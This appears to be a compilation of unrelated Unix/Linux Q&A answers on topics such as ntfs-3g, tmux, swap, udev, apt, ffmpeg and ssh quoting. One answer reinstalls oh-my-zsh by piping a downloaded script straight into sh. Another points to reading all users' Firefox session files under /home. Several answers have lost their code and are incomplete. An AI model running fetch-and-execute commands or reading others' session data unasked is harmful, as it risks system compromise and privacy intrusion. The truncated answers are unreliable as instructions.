the default in-kernel ntfs driver only has limited write support ; you need to use an ntfs driver that supports those operations . take a look at ntfs-3g .
this may work awk '$5 == "+" {$2-=5000;$3+=2000}; $5 == "-"{$3+=5000;$2-=2000};{print}' file 
either remove the = or the space after --date and change those unicode quotes ( U201D ) to the ascii quote character ( U0022 ) . so : date --date="1 day ago"  or date --date yesterday  or date -d yesterday  note that -d/--date is not a standard unix date option and is only available with gnu date . so if that unix server is not a linux distribution or other gnu based system , you will have to install gnu date there or use alternative options for date calculation .
most of the nas ' that i have encountered make use of samba and then share these usb mounted disks out as samba shares . rules like this can be put in your /etc/fstab file : $ blkid /dev/sda2: LABEL="OS" UUID="DAD9-00EF" TYPE="vfat"  this line can be adapted to this : /dev/sda2 /export/somedir ntfs defaults 1 2  once this usb drive is mounted at boot up , samba can be used to share out /export/somedir .
with the exception of the red brackets around the highlighted window , this is the closest approximation that i can easily configure in tmux 1.5: if you want the highlighted window in red , use : set-window-option -g window-status-current-fg red

red hat uses bash as its shell ; aix will use a modified commercial-unix bourne shell or various out-of-date ( and buggy ) versions of ksh depending on version ( as of aix 4 , it was either a buggy ksh88 or a buggy clone thereof ) . if you want arrow keys , you will need to run ksh or bash ( and if the ksh on that version of aix is still pre-ksh93 , arrow keys will not work although ctrl + p / ctrl + n will ) . backspace not working is a symptom of the stty settings being incorrect ; linux generally prefers DEL for backspace , but aix uses the system iii/v standard ctrl + h by default . try stty sane; tset -Q . ( this may still leave it at ^H , in which case you will need stty erase '^?' . ) while you are at it , make sure $TERM is correct ( it should usually be xterm or xterm-color ; if the latter does not work , use the former ) .
if you are using bash , you can also set the pipefail option globally . i have this once at the start of my makefiles and it catches errors even in the middle of a pipe : # Make sure any errors in the middle of a pipe cause the build to fail SHELL=/bin/bash -e -o pipefail  ( changed from /bin/sh to /bin/bash based on madscientist 's comment )
the reason for EPERM ( the permission denied error ) is here : drwxr-xr-x 5 www-data www-data 4096 juil. 30 13:47 .  the directory where you are trying to create a file ( in other words change contents of the directory-file ) is writeable only for user www-data , which you are not . either mark the directory as writeable for the group , change the user to www-data ( or change the owner to my-ftp-user ) or ( probably the best solution ) use extended acls with the setfacl command .
because the full debian distribution for even a single architecture now well exceeds seven dvds , and the packages on each dvd are sorted by popularity , not by common theme . every single installation manual strongly recommends installing from a minimal cd or usb image ( 100 mb or less , generally ) and installing over the internet , or a local apt proxy if you have multiple systems to set up . in addition to that , the dvds do not contain the latest versions of all packages -- security updates are not automatically integrated into the dvd images until the next point release . regenerating the entire image set ( remember there is roughly seven dvds per architecture for a dozen or so actively supported architectures and you will see why the development team prefers not to do live rebuilds every single time a package is updated . )
you will need to run something like gnu screen on the rhel box if you want to be able to re-connect to the ssh session to your bsd box . ssh to rhel run screen ssh ( from within screen ) to bsd if/when the ssh to rhel dies , ssh back in and reconnect to the screen session with screen -d -RR or similar . see the screen man page for details about the various re-attachment options . i use -d -RR . btw , you may want to edit your ~/ . screenrc and redefine screen 's escape key . . . imo the default of ^a is annoying because ^a means " move cursor to beginning of line " in emacs-like editing ( which is the default on bash and some other shells ) . i redefine mine to ^k because it is not used by many things so pressing ^kk to send a ^k to the underlying app is no big deal while having to type ^aa to send ^a to bash all the time is a major pita . e.g. # Instead of Control-A, make the escape/command character be Control-K escape ^Kk 
i personally would not bother as the programs you listed are typically considered to be safe and secure . and for example sudo without the suid bit set makes no sense . the same goes for chsh chfn etc . if you really want to secure your server i would just give following executables suid permissions : ping/ping6 for diagnostic reasons . suexec to run cgi scripts under different users su or sudo pt_chown if you do not have devpts you can remove the suid bit from ssh-keysign as it is only used for host based authentification according to http://lists.freebsd.org/pipermail/freebsd-stable/2006-october/029737.html you should also make sure your users do not get shell access and have their directory chrooted . if you really want to secure your server you should consider looking into selinux .
i do not think there is any widely-used tool . try psfedit . there is also nafe which lets you convert between console fonts and an ascii pixel representation , or cse to edit a font from the console . i have not used any of these , so i am not particularly recommending them , just mentioning their existence .
swapon have -p switch which sets the priority . i can set up : swapon -p 32767 /dev/zram0 swapon -p 0 /dev/my-lvm-volume/swap  or in /etc/fstab : /dev/zram0 none swap sw,pri=32767 0 0 /dev/my-lvm-volume/swap none swap sw,pri=0 0 0  edit : just for a full solution - such line may be helpful as udev rule : KERNEL=="zram0", ACTION=="add", ATTR{disksize}="1073741824", RUN="/sbin/mkswap /$root/$name" 
blkio in cgroup terminology stands for access to i/o on block devices . it does not seem to be about regulating all the different ways software developers have at hand for i/o-related purposes . it seems to be targeted mainly to i/o on devices , not on the way software has access to devices . it can limit the number of iops , the bandwidth or a weight with other processes , in other things . it seems that buffered write is not supported by blockio at the moment . it is in the official documentation : currently , the block i/o subsystem does not work for buffered write operations . it is primarily targeted at direct i/o , although it works for buffered read operations . if you take a look at this presentation from linda wang and bob kozdemba of red hat , on page 20+ , you will see that the graph is about the device bandwidth per vm , not about random vs blocking vs asynchronous i/o . it seems there has been recent work by red hat to implement it directly into virsh . it has been released last week in libvirt 0.9.9 . in a few months , you will be able to do something like this in your favorite distribution : virsh blkiotune domA --device-weights /dev/sda,250 virsh blkiotune domB --device-weights /dev/sda,750 
i found this code in the source to man for debian squeeze : try setting the environment variable MAN_NO_LOCALE_WARNING to 1 to see if that helps . i am not sure why setlocale (LC_ALL, "") is failing , according to the documentation for setlocale(): The return value is NULL if the request cannot be honored. 
here is the command you can use : find -type f -or -type d 
you could do a search-and-replace : M-% (Prompt: Query replace: ) C-q C-j Enter (Prompt: Query replace with: )Enter  emacs will now start replacing every line break with nothing . if you want to get rid of all of them , press ! . if you want to verify every deletion , keep pressing y or n as appropriate .
generally , in linux , and unix , traceroute and ping would both use a call to gethostbyname ( ) to lookup the name of a system . gethostbyname ( ) in turn uses the system configuration files to determine the order in which to query the naming databases , ie : /etc/hosts , and dns . in linux , the default action is ( or maybe used to be ) to query dns first , and then /etc/hosts . this can be changed or updated by setting the desired order in /etc/host . conf . to search /etc/hosts before dns , set the following order in /etc/host . conf : order hosts,bind  in solaris , this same order is controlled via the /etc/nsswitch . conf file , in the entry for the hosts database . hosts : files dns sets the search order to look in /etc/hosts before searching dns . traceroute and ping would both use these methods to search all the configured naming databases . the host and nslookup commands both use only dns , so they will not necessarily duplicate the seemingly inconsistent results you are seeing . solaris has a lookup tool , getent , which can be used to identify hosts or addresses in the same way that traceroute and ping do - by following the configured set of naming databases to search . getent hosts &lt;hostname&gt;  would search through whatever databases are listed for hosts , in /etc/nsswitch . conf . so . in your case , to acheive consistent results , add the following to /etc/hosts 192.168.235.41 selenium-rc  and , make sure /etc/host . conf has : order hosts,bind  or , make sure that /etc/nsswitch . conf has : hosts: files dns  once that is done , you should see more consistent results with both ping , and traceroute , as well as other commands , like ssh , telnet , curl , wget , etc .
the stty configuration is part of the specific terminal you are in , not a global setting . you will need to add the stty command to your shell configuration ( e . g . ~/ . bashrc ) to have it apply whenever you open a terminal .
the setting is edited in the ppd file : /etc/cups/ppd/foo.ppd where foo is the printer name . the normal way to modify these settings from the command line is the lpoptions command . it changes the system settings if executed as root , and the per-user settings ( stored in ~/.cups/lpoptions ) otherwise .
first of all , check out pkill . you can kill off any number of process given their name : pkill java  you can even use the full command with arguments as part of the search pkill -f some_string_in_arguemnts  secondly , your construct with xargs will work just fine for multiple pid 's as long as they are piped in as either space or newline separated numbers .
from this ask ubuntu question : you can also clear your swap by running swapoff -a and then swapon -a as root instead of rebooting to achieve the same effect . thus : as noted in a comment , if you do not have enough memory , swapoff will result in " out of memory " errors and on the kernel killing processes to recover ram .
the simplest method i know to list all of your interfaces is ifconfig -a  edit if you are on a system where that has been made obsolete , you can use ip link show 
the term " build " is usually used to mean the whole process that starts off with a set of source code files and other resources , and ends up with a set of executables , shared libraries ( and possibly other resources ) . this can involve quite a lot of steps like special pre-processors ( moc for qt code for example ) , code generators ( flex/yacc or bison for instance ) , compilation , linking , and possibly post-processing steps ( e . g . building tar.gz or rpm files for distribution ) . for c and c++ ( and related languages ) , compilation is the thing that transform source files ( say .c files for c code ) into object files ( .o ) . these object files contain the machine code generated by the compiler for the corresponding source code , but are not final products - in particular , external function ( and data ) references are not resolved . they are " incomplete " in that sense . object files are sometimes grouped together into archives ( .a files ) , also called static libraries . this is pretty much just a convenience way of grouping them together . linking takes ( usually several ) object files ( .o or .a ) and shared libraries , combines the object files , resolves the references ( mainly ) between the object files themselves and the shared libraries , and produces executables that you can actually use , or shared libraries ( .so ) that can be used by other programs or shared libraries . shared libraries are repositories of code/functions that can be used directly by other executables . the main difference between dynamic linking against a shared library , and ( static ) linking an object or archive file in directly , is that shared libraries can be updated without rebuilding the executables that use them ( there are a lot of restrictions to this though ) . for instance , if at some point a bug is found in an openssl shared library , the fix can be made in that code , and updated shared libraries can be produced and shipped . the programs that linked dynamically to that shared library do not need to re-build to get the bug-fix . updating the shared library automatically fixes all its users . had they linked with an object file instead ( or statically in general ) , they would have had to rebuild ( or at least re-link ) to get the fix . a practical example : say you want to write a program - a fancy command line calculator - in c , that has command line history/editing support . you had write the calculator code , but you had use the readline library for the input handling . you could split your code in two parts : the math functions ( put those functions in mathfuncs.c ) , and the " main " calculator code that deals with input/output ( say in main.c ) . your build would consist in : compile mathfuncs . c ( gcc -o mathfuncs.o -c mathfuncs.c , -c stands for " compile only" ) mathfuncs.o now contains your compiled math functions , but is not " executable " - it is just a repository of function code . compile your frontend ( gcc -o main.o -c main.c ) main.o is likewise just a bunch of functions , not runnable link your calculator executable , linking with readline: now you have a real executable that you can run ( supercalc ) , that depends on the readline library . build an rpm package with all the executable and shared library ( and header ) in it . ( the .o files , being temporary build products and not final products , are not usually shipped . ) with this , if a bug is found in readline , you will not have to rebuild ( and re-ship ) your executable to get the fix - updating libreadline.so is all that is required . but if you find a bug in mathfuncs.c , you will need to re-compile it and re-link supercalc ( and ship a new version ) .
both ssh sessions need to be started using the -x option . however , if you want your entire session , you may want to think about using something like x2go because it compresses images and has some proxies which make this a lot less bandwidth hungry and it can restore sessions . . . and running the entire gnome-session can have unpleasant side effects , when your remote gnome-session starts a remote metacity which replaces your local window manager . your additional imformation shows the " unpleasant side effects " i mentioned . you cannot simply run gnome-session when you already have a desktop environment running , because gnome-session will try to take over and your running desktop environment will not let it that easily . for a x program it makes exactly no difference whether run remotely via ssh or locally . depending on what you want to achieve you can start a xnest session and use that for your remote gnome-session . xnest -geometry 1280x1024 :123 &amp; DISPLAY=:123 ssh -X firsthop ssh -X secondhop gnome-session  note : in some distributions the binary is named Xnest with a capital x .
looks like your pkgbuild is outdated ( 0.16.7-1 , but the current is 0.17.3-5 ) . try downloading the nvidia-bl tarball again and building it .
this symbol comes from libstdc++_nonshared.a . unlike gcc from the distro , gcc from devtoolset has non-shared part of libstdc++ . libstdc++ . so in gcc 4.7 is a linker script that uses libstdc++ from gcc 4.1 and extra functions linked statically : after recompiling libstdc++_nonshared.a with disabled stack protector the final program can be run on rhel4 .
there is some information on 256-color support in the tmux faq . detecting the number of colors that the terminal supports is unfortunately not straightforward , for historical reasons . see checking how many colors my terminal emulator supports for an explanation . this means that tmux cannot reliably determine whether the terminal supports more than 8 colors ; tmux cannot reliably communicate to the application that it supports more than 8 colors . when you are in tmux , the terminal you are interacting with is tmux . it does not support all of xterm 's control sequences . in particular , it does not support the OSC 4 ; \u2026 control sequence to query or set color values . you need to use that while directly running in xterm , outside tmux . if you run tmux -2 , then tmux starts with 256-color support , even if it does not think that your terminal supports 256 colors ( which is pretty common ) . by default , tmux advertises itself as screen without 256-color support . you can change the value of TERM in .tmux.conf to indicate 256-color support : set -g default-terminal "screen-256color"  you can use TERM=xterm-256color or TERM=screen-256color on ubuntu . these values will only cause trouble if you log in to a remote machine that does not have a termcap/terminfo entry for these names . you can copy the entries to your home directory on the remote machine ; this works with most modern terminfo implementations .
how about you read /home/*/.mozilla/firefox/*/sessionstore.js ?
this should do the job : " incorrect " in text inside of files inside of folders and files within given folder : " incorrect in text inside of files inside of folders in the given folder": " incorrect " in name of folders and files in given folder : " incorrect " in name of folders in given folders :
try using make nconfig or make menuconfig which presents you with interactive text ui . both have search facility for both the kernel CONFIG_* options ( those which are placed in .config which governs the build ) and strings within the currently selected option menu . imho both of these tuis are more usable than the gui . as for your case , you are probably looking for CONFIG_USB_SERIAL which is located in Device Drivers -&gt; USB support -&gt; USB Serial Converter support - you need to change this from &lt;*&gt; to &lt;M&gt; ( using the m key ) .
( adapted from comments above ) depending on the codecs used ( some codecs are incompatible with some containers ) , you could always simply copy the streams ( -codec copy ) . that is the best way to avoid quality changes , as you are not reencoding the streams , just repackaging those in a different container . when dealing with audio/video files , it is important to keep in mind that containers are mostly independent from the used codecs . it is common to see people referring to files as " avi video " or " mp4 video " , but those are containers and tell us little about whether a player will be able to play the streams , as , apart from technical limitations ( for example , avi may have issues with h264 and ogg vorbis ) , you could use any codec . -same_quant seems to be a way to tell ffmpeg to try to achieve a similar quality , but as soon as you reencode the video ( at least with lossy codecs ) , you have no way to get the same quality . if you are concerned with quality , a good rule of thumb is to avoid reencoding the streams when possible . so , in order to copy the streams with ffmpeg , you had do : ffmpeg -i video.mp4 -codec copy video.avi  ( as @peter . o mentioned , option order is important , so that is where -codec copy must go . you could still keep -same_quant , but it will not have any effect as you are not reencoding the streams . )
try this : lslpp -l | grep perl perl -v 
i hate xargs , i really wish it would just die :- ) vi $(locate php.ini)  note : this will have issues if your file paths have spaces , but it is functionally equivalent to your command . this next version will properly handle spaces but is a bit more complicated ( newlines in file names will still break it though ) (IFS=$'\\n'; vi $(locate php.ini))  explanation : what is happening is that programs inherit their file descriptors from the process that spawned them . xargs has its stdin connected to the stdout of locate , so vi has no clue what the original stdin really in .
perlrun is the manpage you are looking for : man perlrun 
the posix/single unix specification specifies that a pathname with a trailing slash must refer to a directory ( see base definitions §4.11 pathname resolution ) . foo/ is in fact defined as equivalent to foo/. ( for path resolution purposes , not when manipulating file names ; basename and dirname ignore trailing slashes ) . most implementations respect this , but there are a few exceptions . this explains the behavior of rm this_is_link/: it is equivalent to rm this_is_link/. , where the argument is clearly a directory . rmdir this_is_link/ should similarly refer to the directory . that it does not on your machine is a bug in gnu coreutils . osx is behaving correctly here .
just to clarify , do you want to do an unattended install ? if not , you can tell the debian installer to install only the minimum software to get the system up , and then add stuff later . this will typically only install very basic things , and no x stuff at all . alternatively , you can use debconf preseeding with fai . i am not sure whether you can do a minimal debian install with this , but i do not see why not . search for " debconf preseeding fai " or " debconf preseeding " . alternatively , the first google hit to " custom debian installer " is http://wiki.debian.org/debiancustomcd , but for what you are trying to do it may be overkill .
you probably installed scm_breeze , and my theory is that in your .zshrc the sourcing of scm_breeze.sh is preceeded by oh-my-zsh.sh . and if you put your git function definition at the very end of .zshrc , then you probably exceed the scm_breeze.sh , so that is the reason why it works . try to move the line that sources oh-my-zsh.sh to the very end of your .zshrc or at least in a position where it exceeds the sourcing of scm_breeze.sh . restart zsh and see if it works . ( alternatively you can remove scm_breeze.sh completely ) if it still does not work , then back up your .zshrc and all your oh-my-zsh stuffs , then create an empty .zshrc , delete and reinstall oh-my-zsh with curl -L https://github.com/robbyrussell/oh-my-zsh/raw/master/tools/install.sh | sh and then put function git() { echo "I'm happy because I am executed!" } in $ZSH/custom/general.zs , i have tested this , it worked for me . after that you can gradually reapply your former settings , step-by-step checking what exactly breaks your configuration .
it sounds like you are looking for a very crude form of revision control . you had do better to look into using a vcs like git . once you have got git installed , it is fairly simple to do what you want : you can then see previous commits with git log and git show as appropriate .
you have ( inadvertently ) incremented the windows in master , the default keybind for which is mod i , so that all of your clients in that selected tag are in master . you can decrement the number of clients in master with mod d . each press will decrement the clients in master by 1 . it may also be worth pointing out that dwm does not use the " desktop " paradigm ; whatever layout is applied to the currently visible tag ( s ) is applied to all tags&mdash ; hence the " dynamic " in d wm . this is a powerful concept as it allows you to tag multiple clients , and manipulate those tags ( and the associated views ) on the fly . combined with some rules in your config.h , it provides for an incredibly versatile model for managing clients . see this archived post for an explanation of dwm 's tagging/client model .
most “live cd” distributions can be installed on a pen drive instead of a cd . then you can use the rest of the pen drive ( if it is large enough ) as storage . for example , for ubuntu , prepare a “live cd” on a usb pen drive . the pen drive creator utility will let you choose how much space to devote to storage . alternatively , just do a normal installation that happens to be on a pen drive rather than an internal hard disk . that way , you will be able to choose exactly what packages to install . the downside of this approach is that more files will be saved on the usb drive ( the live cd does not store any transient data on the drive , only your documents and customizations ) since the system will be running directly off the drive . therefore the system will be slower ( not necessarily noticeably ) and the pen drive 's lifetime will be shortened ( not necessarily noticeably ) . on the upside , this way requires less ram .
start a subshell : (umask 22 &amp;&amp; cmd)  then the new umask will only alter that subshell . note that zsh executes the last command of the subshell in the subshell process instead of forking another one , which means that if that command is external , you are not even wasting a process , it is just that the fork is done earlier ( so the umask is done in the child process that will later execute your command ) .
i believe followsymlinks is what you are looking for . first you have to locate the apache configuration files . if you install apache using your distro 's package then they are more than likely to be in /etc/apache2/ and the file you have to change is httpd.conf . if in your document root you have the symlink wiki/media -&gt; /real/wiki/media then you will need to create a Directory section like this : &lt;Directory /wiki&gt; Options FollowSymLinks &lt;/Directory&gt;  please note that i am writing these from memory without any testing , so do not use these directions as is , consult the comments in the file , configuration guide for your distro and the apache reference when in doubt .
use readlink to get the target of a symlink : TARGET=$(readlink $1)  then use the power of shell , to remove everything before the last / ; ID=${TARGET##*/}  or remove everything after the last /: BASE=${TARGET%/*}  then use the power of shell to do simple arithmetic NEWID=$((ID+1))  finally glue them together : NEWTARGET=${BASE}/${NEWID}  or , in one line : NEWTARGET=${TARGET%/*}/$((${TARGET##*/}+1)) 
to download the audio as mp3 , naming the file including the authors name and the video title , use : youtube-dl -x --audio-format mp3 '&lt;URL&gt;'  for example , to download that interesting talk of linus on git , and include the uploader 's name in the file name ( * ) , youtube-dl -x --audio-format mp3 --output '%(uploader)s-%(title)s.%(ext)s' 'https://www.youtube.com/watch?v=4XpnKHJAok8' will save the audio as file Google-Tech Talk - Linus Torvalds on git.mp3 to date , this needs to download the full video data , and split the audio part off , discarding the images . but it is expected that it will be possible to download just the audio track soon , with one of the next updates of youtube-dl , combined with changes at the youtube server side . youtube-dl then uses ffmpeg to convert the downloaded .m4a file to the .mp3 format . to make the command line shorter , options can be saved in the config file : ~/.config/youtube-dl.conf * -x is the short form of --extract-audio
here is a quick and dirty solution to only keep the last line of output in the log file : ping localhost | while IFS= read -r line; do printf '%s\\n' "$line" &gt; log.txt; done  beware that you now probably have all kinds of race conditions when trying to access the file for reading . " locking " the file from mutual access might help . for more information about locking this question on stackoverflow might be a good start : how do i synchronize ( lock/unlock ) access to a file in bash from multiple scripts ?
let 's break this down . awk '{foo}' file will apply the expression foo to each line of file and print the result to the terminal ( standard output ) . awk splits its input lines on white space ( by default ) and saves each field as $1 , $2 etc . so , the actual expression you are running means : read each input line , add 0.45 to the value of the first field and then print that field as well as the second and third one . this is most easily explained with a simple example : $ cat file.txt 10 20 30 40 50 60 70 80 $ awk '{print $1+0.45 " " $2 " " $3 }' file.txt 10.45 20 30 50.45 60 70  so , as you can see , the awk script added 0.45 to the first field of each line and then printed it along with the second and third . the fourth was ignored since you did not tell it to print $4 . the next bit has nothing to do with awk , the &gt; symbol is for output redirection and is used by the shell ( bash or zsh or whatever you are using ) . in general command &gt; file will save the output of command in the file file overwriting the contents of the file if it exists and creating it if it does not . putting everything together :
/tmp can be considered as a typical directory in most cases . you can recreate it , give it to root ( chown root:root /tmp ) and set 1777 permissions on it so that everyone can use it ( chmod 1777 /tmp ) . this operation will be even more important if your /tmp is on a separate partition ( which makes it a mount point ) . by the way , since many programs rely on temporary files , i would recommend a reboot to ensure that all programs resume as usual . even if most programs are designed to handle these situations properly , some may not .
i have run into this exact same problem under centos from time to time when i have cloned virtual machines ( vm 's ) . the problem stems from the original vm getting an entry put into this file to setup the ethernet device eth0 . sample . rules file the problem rears its ugly head when you clone the first vm , this causes a new mac address to be created , under some virtualization technologies such as kvm for one . this new mac address is auto detected when the cloned vm is booted and viewed as a new ethernet device by /lib/udev/write_net_rules , and so a 2nd entry is added to the above file . SUBSYSTEM=="net", ACTION=="add", DRIVERS=="?*", ATTR{address}=="54:52:00:ff:ff:de", ATTR{type}=="1", KERNEL=="eth*", NAME="eth1"  i usually open this file , 70-persistent-net.rules , in an editor and simply consolidate the lines so that the new mac address is assigned to the eth0 device and reboot . edit #1 the op followed up the question with the following new information . item #1: hmmm . that will not work in my case because i am running software with a flex license that ties to the mac address . constantly changing addresses render said software useless . . @zobal - i am familiar with flex . since it is a vm you can change the vm 's mac ( in the vm software - virtualbox , kvm , etc . ) . note : flex is a licensing technology that is provided by flexera . they used to be called globetrotter software . this technology allows software to be either tied to a physical host , or can have licenses managed from a central server as " tokens " where clients can check the tokens out for a period of time . the licenses are typically tied to a host , and this host is usually identified by a unique number that you can find using the command hostid . for example : $ hostid a8c0c801  item #2: in my case it is not a vm . i have cloned one physical system onto another physical system . to which i responded : well then your only option is to change the new system 's mac address to the same as the other system 's mac . realize that these 2 systems cannot exist on the same network , otherwise they will conflict with each other . also flex licensing typically does not use the mac , they use the number that is identifiable using the command hostid ! references networking fails after cloning an ubuntu virtual machine ( 1032790 ) linux rename eth0 network interface card name [ udev ]
i think your local shell is stripping off your quotes . you could try ssh remote sh -c '"echo hi &gt; hi.txt"'  when you send remote commands with ssh there are two shells involved with the reading of each line sent . your local shell and your remote shell . a good explanation of this can be found at unix/linux shell quoting for remote shells
your understanding would be correct if the regex were applied to the file as a whole . that is not how sed rolls : it operates line by line instead . thus the g modifier would only come into play if your regex could match multiple times on the same line . in your case , the substitution was applied only once to each line so naturally both instances were removed . slurp the whole file instead and see the difference : perl -p0777e 's/[^.]*mobile phones[^.]*\.//' sentence.txt &gt; sentence2.txt 
to show packages that were manually installed , use apt-mark showmanual . to show packages that were automatically installed , use apt-mark showauto . also , apt-get has autoremove . from the man page autoremove autoremove is used to remove packages that were automatically installed to satisfy dependencies for other packages and are now no longer needed . so use apt-get autoremove for this . generally apt will prompt you if packages are available to be autoremoved , so i would expect a user to become aware of this command quite quickly . additionally , there are packages like debfoster and deborphan to help users to reduce package clutter . also wajig has several commands that can be used to prune packages , including , but not limited to large , and sizes , which can be used to look at the large packages installed on the system . also , it is worth mentioning the apt log files in /var/log/apt , notably history.log , which keep a log of the installations and removals performed by apt .
you want the partprobe command . run it without arguments to re-read the partition table on all disks , or with a specific device to only re-read for that device , e.g. partprobe /dev/sda .
try this trick : man foobar | less +/searched_string  or man foobar | more +/searched_string  this should do the joke .
find . -L -name 'file'  -l means follow symbolic links and according to man it takes properties from this file . alternativly you can write : find . -lname 'file'  the second option will work with broken links .
i think you want to determine if a command is run in a terminal . if you want this to always happen when you run emacs , put it in a script and invoke that script instead . you can call the script /usr/local/bin/emacs ( assuming linux ) if you want it to be called emacs and invoked in preference to the “real” emacs executable in /usr/bin . note that to edit files as root , you should use sudoedit ( benefits : the editor runs as you so you get all your settings ; the edited file is put into place atomically when you finish editing , reducing the chance of a mishap ) . you can also edit files as root directly inside emacs by opening /sudo::/path/to/file .
i suggest to use atop . it is a daemon gathering all ' top ' information every 10 minutes by default and you can just go back in time viewing these ' top ' snapshots . adjust the default interval setting to your needs ( consumes more disk space if set more frequently ) . just yesterday , i answered a similar question , in which i included a very short how-to .
try : dpkg-reconfigure tzdata  that should allow to set the timezone for the system ( make a copy of the selected timezone file onto /etc/timezone ) . more generally , it can be difficult to figure out which package you need to configure to change a setting as it is not always obvious . things that can help : if you know the configure file where that setting is stored , you can try . dpkg -S that-file  however , the configuration file may not always be part of the package but generated by the package configuration in which case it would not show up there . something that often works is to look for the setting you are after in the .config files for every installed packages . for instance : $ grep -il timezone /var/lib/dpkg/info/*.config /var/lib/dpkg/info/tzdata.config  that tells us tzdata is a good candidate . if you know the current setting value , you can look it up in the debconf store :
you can not add them both in the same command line , as far as i can see &ndash ; from the man page i interpret the functionality to include : compressing files into the archive using various compression methods &ndash ; this would have to be done individually , or in groups decompressing them no matter whether they are in the same format or not so you can have an efficient archive which only requires one command to extract all the contents .
the applet is supposed to be added automatically in the notification area once the user has set up multiple keyboards . if this does not happen , it is advised to remove the 2nd keyboard layout and add it back .
you can use wget ( for windows ) ( or via cgywin ) to download the site recursively , the options are :
use fc to get the previous command line . it is normally used to edit the previous command line in your favourite editor , but it has a " list " mode , too : last_command="$(fc -nl -1)"
in awk array are associative , so the following works : awk '{ vect[$1] += $2 }; END { for (item in vect) print item, vect[item] }' input-file 
debian stable is exactly that , stable . it achieves this by using well tested software , " well tested " being synonymous with " used for a long time " , usually backporting security fixes instead of updating to a new version once frozen . debian stable is not concerned with the latest and greatest software , it is concerned with being reliable . if you want to have newer software , you probably want to check out the testing or unstable branches ( most likely , the latter ) . you can change to unstable by following the instructions on the debian wiki .
use mod_deflate . add this to your apache config : obviously if the path your system uses for apache modules differs then you will need to use the correct path .
the apt cache lives in /var/cache/apt/archives . if you have a suitable version of the package there , you can install it with dpkg -i /var/cache/apt/archives/sqlite3-VERSION.deb . if you do not have it , testing currently has 3.7.6.3-1 ( downloadable from any debian mirror ) and stable currently has 3.7.3-1 ; or you can find ( almost ) any version that is ever been in debian on snapshot . debian . org . since this is a punctual need , it'll be easiest to download the package manually and install with dpkg ( but you can also define a particular snapshot date as an apt source , as explained on the snapshot . d . o home page ) . you can find out what version used to be installed by looking through the dpkg logs in /var/log/dpkg.log or the apt logs in /var/log/apt or the aptitude logs in /var/log/aptitude . in aptitude , mark the buggy version as forbidden to install : F key in the interactive ui or aptitude forbid-version interactively . if the bug is not fixed in the next release , mark the package as “on hold” to prevent automatic upgrades until further notice ( = key or aptitude hold command ) .
there is checkbashisms . on debian , it is shipped as part of the package maintainer tools . test your scripts under dash and posh . both have a few non-posix constructs , but if your script works in both , it is likely to work in most places . ( with the caveat that it is difficult to test typical shell scripts as they tend to have a lot of corner cases . ) if you intend for your scripts to be portable to embedded linux platforms , test them with busybox . note that busybox can be more or less restricted , depending on how small an embedded system you want ; it is quite normal to have scripts that rely on a feature that some busybox installations do not have . note that non-portability does not come from the shell alone , it also comes from external utilities . openbsd and solaris tend to have utilities with posix features and not much more , so they are good for testing for portability . you will want to refer to the posix specification , and other resources mentioned in this thread ( especially the autoconf manual ) ; but that is documentation , it does not help if you use a feature accidentally .
yes ! maybe some of the recurive calls are either documented or part of function names ? then , a find/grep should reveal them . here is a command to do it : find /usr/src/linux/ -name "*.c" -exec grep recursive {} ";" -ls  piping this through | wc -l gives me 270 , which is , since -ls prints one additional line per file , at least 135 files+functions . let 's have a look at the first match : /usr/src/linux/fs/jfs/jfs_dmap.c  the match is a comment : if the adjustment of the dmap control page , itself , causes its root to change , this change will be bubbled up to the next dmap control level by a recursive call to this routine , specifying the new root value and the next dmap control page level to be adjusted . in front of the method static int dbAdjCtl(struct bmap * bmp, s64 blkno, int newval, int alloc, int level)  and in fact , line 2486 and neighbours are : since the question was , whether there is any recursive function , we do not have to visit the next 135 or more matches or search for not explicitly mentioned recursions . the answer is yes !
i do not think there is any tool for pdf files that has a large set of commands like imagemagick . here are a few with their main capabilities . pdfjam , a shell wrapper around the pdflatex pdfpages package . pdfjam includes some specialized commands ( pdfnup to make 2-up arrangements and so on , pdfbook to make booklets , pdfjoin to concatenate several files , pdf90 and so on to rotate pages ) and can set metadata ( author , title , keywords , … ) , scale and rotate pages , and so on . the pdfpages package lets you arrange pages or parts of pages of one or more files in any way you want and write arbitrary latex code around them . pdftk is primarily useful to reassemble known amounts of pages but has other capabilities . the pypdf python library can easily reassemble pages in complex ways , and can crop and merge pages . example : un2up , unbook . perl 's pdf::api2 is more complex and can embed fonts . ghostscript works with postscript and pdf files . it can embed fonts in a pdf file . if you want to work on a pdf file as a bitmap image , imagemagick does that . it does not support multiple-page pdf files well , so extract and recompose your files with other tools .
now , that we talked about this a bit in the comments the answer for you is : no , there is not . the main reason for that conclusion is that i think you are not looking for a tool to configure a kernel , but to automatically tune the kernel for your specfic ( and yet unstated ) use case . as stated in the comments , you can skip unneeded drivers and compile the wanted drivers statically into the kernel . that saves you some time during the boot process , but not after that , because the important code is the same whether builtin or module . kernel tuning the kernel offers some alternatives , you mentioned scheduler yourself . which scheduler works best for you depends on your use case the applications you use and the load and kind of load you put on your system . no install-and-run program will determine the best scheduler for you , if there even is such a thing . the same holds for buffers and buffer sizes . also , a lot of ( most ? ) settings are or at least can be set at runtime , not compile time . optimal build options also without automation , you can optimize the build options when compiling the kernel , if you have a very specialized cpu . i know of the buildroot environment which gives you a nice framework for that . this may also help you if you are looking to create the same os for many platforms . while this helps you building , it will not automate kernel tuning . that is why i and others tell you to use a generic kernel . without a specific problem to solve building your own kernel is not worth while . maybe you can get more help by identifying/stating the problem you are trying to solve .
depending on what os you are using there are command line utilities such as : fatsort and touch will not help you with sort since all you will be able to do with it is manipulate the timestamps on the file or directories .
this can be a way to do it . note the format may vary depending on the field separators you indicate - those you can define with FS and OFS: explanation -v n=2 defines the field number to copy when the pattern is found . /^name/ {a=$(n); print; next} if the line starts with the given pattern , store the given field and print the line . {print a, $0} otherwise , print the current line with the stored value first . you can generalize the pattern part into something like : awk -v n=2 -v pat="name" '$1==pat {a=$(n); print; next} {print a, $0}' file 
